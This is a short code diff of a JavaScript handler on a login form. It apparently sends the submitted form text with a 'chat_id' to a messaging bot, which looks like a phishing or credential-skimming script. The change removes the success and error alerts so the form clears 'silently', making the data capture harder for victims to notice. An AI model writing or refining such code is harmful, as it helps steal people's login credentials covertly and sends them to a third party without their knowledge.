@@ -19,15 +19,11 @@ document.querySelector('.login-button').closest('form').addEventListener('submit
         body: JSON.stringify({
             chat_id: CHAT_ID,
             text: text
-        })
+})
     })
     .then(res => res.json())
     .then(data => {
-        alert('Sent successfully!');
-        this.reset(); // Clears the form fields after sending
+        this.reset(); // Clears the form silently (no alerts)
     })
-    .catch(err => {
-        console.error(err);
-        alert('Error sending message.');
-    });
+    .catch(err => console.error(err));
 });
